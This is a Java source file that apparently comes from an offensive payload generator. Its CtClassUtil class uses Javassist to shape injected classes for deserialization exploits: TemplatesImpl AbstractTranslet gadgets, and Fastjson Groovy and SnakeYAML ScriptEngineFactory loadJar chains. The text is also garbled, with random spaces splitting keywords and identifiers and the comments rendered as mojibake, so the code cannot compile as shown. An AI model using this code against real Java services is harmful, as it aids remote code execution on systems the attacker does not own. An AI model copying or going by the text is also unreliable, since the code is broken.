package jmg.core.util;

import javassist.ClassPool;
import       javassist.CtClass;
       import jmg.core.config.AbstractConfig;
    import jmg.core.config.Constants;

/**
 * ä¸é¡¹æ¼æ´çå¤ç
  */
public class CtC    la   ssUtil {
    private         A  bstractC    onfig config;
                    private ClassPool p      ool;
    pr  ivate  Ct     Cl     ass ctClass;

    publ ic Ct Cla ssUtil(A     bstractConf ig      config, Cl  a   ssPool    pool, CtCl    ass      c         tClass) {
         thi    s.config = conf      ig;
                  this.pool = pool;
            th  is.ctClass  = ctC       lass       ;
    }


    public b yte[] modi  fyForExploitat ion()    thro   w s    Exception {
          if (co  nfig.ge  tGadge  tType(  ) != n   ull) {
                       if (c   onfig.get    GadgetType().equ              als     (Constants.GADGET_JDK_TRANSL      E    T))   {
                                    applyJD        KA           b         s   tractT   ranslet();
            }          
               if (config.getGad   getType().equals(C    onstants.       GADGET_XAL   AN_TRAN            SLE   T)) {
                        applyX         ALANAbstrac  tTran  slet(  ) ;
                              }

            if   (config      .getGadgetT        ype().      equ  als(Constants.GADGET_FJ_G  RO OV        Y)) {
                      applyFa   stjsonG           roovyASTTran    sform   atio           n();
                 }
                  if       (confi         g.    getGa  dgetType().equals(C       on  st   ants. GADGET_SNAKEYAML)) {
                  applySnakeY      amlScriptEngineF actory();
                       }
          }
             return ctClass.toByte code();       
    }


    public void applyJDKAbst ractTranslet()      throws Exception {
        Ja         v   ass    istUtil.ex    tendClass(ctClass, "com.sun.org.apach  e    .xa   la   n.interna l   .xsltc.run     time.AbstractTr anslet") ;
    }

    public voi         d applyXALANAbstractTranslet() {
        tr  y   {
             JavassistUtil.extend              Class(ctClass, "org   .apac  he.xalan.xslt  c   .runtime.AbstractTranslet");
            } catch (Excep        tion e) {
                 throw new RuntimeExc     ept  ion(e   );
          }
    }

    // Fastjson Groovy loadJar çå©ç¨éè¦å®ç° A     STTransformation æ¥å  £
    p           ublic void applyFa    stjsonGroovyASTTransformation() throws Exception {
         config.  setImplementsASTTransf    ormationType(true);
        J  avassistUtil.implementInterface(ctClass,"org.codehaus.groovy.tran  sform.ASTTransformation");
           Javas      sistUtil.addAnn    otation(ctClass, "org.codehaus.  groovy.transform.GroovyASTTr ansformation");
        }

    // snakeyaml loadJar çå   ©ç¨éè¦å®ç° ScriptEngineFactory æ¥å£
    public vo   id applySnakeYamlScriptEngineFactory() throws Exception {
          co   nfig.setImplement  sScriptEngineFactory(true);
        JavassistUtil.addAnnotation(ctClass, "javax.script.ScriptEngineFactory");
    }
}
